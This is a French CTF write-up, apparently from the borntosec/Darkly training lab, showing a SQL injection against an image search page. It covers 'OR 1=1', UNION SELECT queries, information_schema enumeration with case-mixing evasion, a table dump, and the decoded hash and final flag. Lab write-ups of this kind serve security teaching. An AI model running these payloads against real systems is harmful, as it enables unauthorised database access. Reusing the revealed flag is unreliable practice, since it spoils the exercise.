# SQL Injection Images

- On voit que dans cette entrée il y a une injection SQL
- On commence donc par recuperé toute les données
```
# Injection
1 OR 1=1
# Result
ID: 1 OR 1=1 
Title: Nsa
Url : https://www.nsa.org/img.jpg

ID: 1 OR 1=1 
Title: 42 !
Url : https://www.42.fr/42.png

ID: 1 OR 1=1 
Title: Google
Url : https://www.google.fr/google.png

ID: 1 OR 1=1 
Title: Obama
Url : https://www.obama.org/obama.jpg

ID: 1 OR 1=1 
Title: Hack me ?
Url : borntosec.ddns.net/images.png

ID: 1 OR 1=1 
Title: tr00l
Url : https://www.h4x0r3.0rg/tr0ll.png
```
- Une entrée s'apelle `Hack Me ?`. On comprend donc qu'il faut y recuperer les autres colonnes
- On recupere le nom de notre Database
```
# Injection
1 UNION SELECT version(),database()
# Result
ID: 1 UNION SELECT version(),database() 
Title: Member_images
Url : 5.5.44-0ubuntu0.12.04.1
```

- On recupere ensuite la table
```
# Injection
1 UniOn Select 1,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=database()
# Result
ID: 1 UniOn Select 1,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=database() 
Title: |list_images|
Url : 1
```

- Puis les differentes colonnes
```
# Injection
1 UNION ALL SELECT column_name,table_name from information_schema.columns
# Result
ID: 1 UNION ALL SELECT column_name,table_name from information_schema.columns 
Title: list_images
Url : id

ID: 1 UNION ALL SELECT column_name,table_name from information_schema.columns 
Title: list_images
Url : url

ID: 1 UNION ALL SELECT column_name,table_name from information_schema.columns 
Title: list_images
Url : title

ID: 1 UNION ALL SELECT column_name,table_name from information_schema.columns 
Title: list_images
Url : comment
```
- Maintentant on peut recuperer les differentes informations
```
# Injection
1 UNION SELECT concat(id,char(58),url,char(58),title,char(58),comment,char(58)),2 FROM list_images
# Result
ID: 1 UNION SELECT concat(id,char(58),url,char(58),title,char(58),comment,char(58)),2 FROM list_images 
Title: 2
Url : 5:borntosec.ddns.net/images.png:Hack me ?:If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46:
```
- On fait se que nous dit le commentaire
```
1928e8083cf461a51303633093573c46 -> albatroz -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```